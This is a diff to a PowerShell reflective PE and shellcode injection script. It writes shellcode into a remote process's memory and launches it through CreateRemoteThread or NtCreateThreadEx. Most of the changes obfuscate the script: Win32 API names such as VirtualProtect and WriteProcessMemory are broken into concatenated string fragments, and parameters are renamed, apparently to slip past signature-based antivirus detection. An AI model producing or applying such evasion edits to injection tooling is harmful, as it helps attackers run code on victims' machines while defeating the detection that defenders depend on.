@@ -458,17 +458,17 @@ $RemoteScriptBlock = {
 		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
 		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
+		$Win32Functions | Add-Member NoteProperty -Name $('Vi'+'rt'+'ual'+'Free') -Value $VirtualFree
 		
 		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
 		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
+		$Win32Functions | Add-Member NoteProperty -Name $('Vi'+'rt'+'ual'+'Free'+'Ex') -Value $VirtualFreeEx
 		
 		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
 		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
 		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+		$Win32Functions | Add-Member NoteProperty -Name $('Vi'+'rt'+'ual'+'Pro'+'te'+'ct') -Value $VirtualProtect
 		
 		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
 		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
@@ -493,7 +493,7 @@ $RemoteScriptBlock = {
 		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
         $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+		$Win32Functions | Add-Member -MemberType $('No'+'te'+'Pr'+'op'+'er'+'ty') -Name $('Wr'+'ite'+'Proc'+'ess'+'Mem'+'or'+'y') -Value $WriteProcessMemory
 		
 		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
         $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
@@ -719,18 +719,18 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 2, Mandatory = $true)]
 		[IntPtr]
-		$StartAddress,
+		$FirstAddress,
 		
 		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
 		[IntPtr]
 		$Size
 		)
 		
-	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
+	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($FirstAddress) ($Size))
 		
 		$PEEndAddress = $PEInfo.EndAddress
 		
-		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
+		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($FirstAddress)) -eq $true)
 		{
 			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
 		}
@@ -900,11 +900,11 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter(Position = 1, Mandatory = $true)]
 		[IntPtr]
-		$ProcessHandle,
+		$ProcHandle,
 		
 		[Parameter(Position = 2, Mandatory = $true)]
 		[IntPtr]
-		$StartAddress,
+		$FirstAddress,
 		
 		[Parameter(Position = 3, Mandatory = $false)]
 		[IntPtr]
@@ -921,8 +921,8 @@ $RemoteScriptBlock = {
 
 		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
 		{
-			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
-			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $NotTodayPal, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
+			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $FirstAddress"
+			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcHandle, $FirstAddress, $NotTodayPal, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
 			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
 			{
@@ -932,8 +932,8 @@ $RemoteScriptBlock = {
 
 		else
 		{
-			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
-			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $NotTodayPal, 0, [IntPtr]::Zero)
+			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $FirstAddress"
+			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $FirstAddress, $NotTodayPal, 0, [IntPtr]::Zero)
 		}
 		
 		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
@@ -1173,7 +1173,7 @@ $RemoteScriptBlock = {
 				Throw "Unable to write shellcode to remote process memory."
 			}
 			
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions #-
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $RSCAddr -Win32Functions $Win32Functions #-
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1194,7 +1194,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -NotTodayPal $RImportDllPathPtr -Win32Functions $Win32Functions #-
+			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $LoadLibraryAAddr -NotTodayPal $RImportDllPathPtr -Win32Functions $Win32Functions #-
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1324,7 +1324,7 @@ $RemoteScriptBlock = {
 			Throw "Unable to write shellcode to remote process memory."
 		}
 		
-		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions #-
+		$RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $RSCAddr -Win32Functions $Win32Functions #-
 		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		if ($Result -ne 0)
 		{
@@ -1394,7 +1394,7 @@ $RemoteScriptBlock = {
 			
 			if ($SizeOfRawData -gt 0)
 			{
-				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
+				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -FirstAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
 				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
 			}
 		
@@ -1402,9 +1402,9 @@ $RemoteScriptBlock = {
 			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
 			{
 				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
-				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
-				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
-				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
+				[IntPtr]$FirstAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
+				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -FirstAddress $FirstAddress -Size $Difference | Out-Null
+				$Win32Functions.memset.Invoke($FirstAddress, 0, [IntPtr]$Difference) | Out-Null
 			}
 		}
 	}
@@ -1736,7 +1736,7 @@ $RemoteScriptBlock = {
 			[UInt32]$SectionSize = $SectionHeader.VirtualSize
 			
 			[UInt32]$OldProtectFlag = 0
-			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
+			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -FirstAddress $SectionPtr -Size $SectionSize | Out-Null
 			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
 			if ($Success -eq $false)
 			{
@@ -2323,7 +2323,7 @@ $RemoteScriptBlock = {
 					Throw "Unable to write shellcode to remote process memory."
 				}
 
-				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions #-
+				$RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $RSCAddr -Win32Functions $Win32Functions #-
 				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 				if ($Result -ne 0)
 				{
@@ -2589,7 +2589,7 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
 
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions #-
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $VoidFuncAddr -Win32Functions $Win32Functions #-
 		}
 		
 
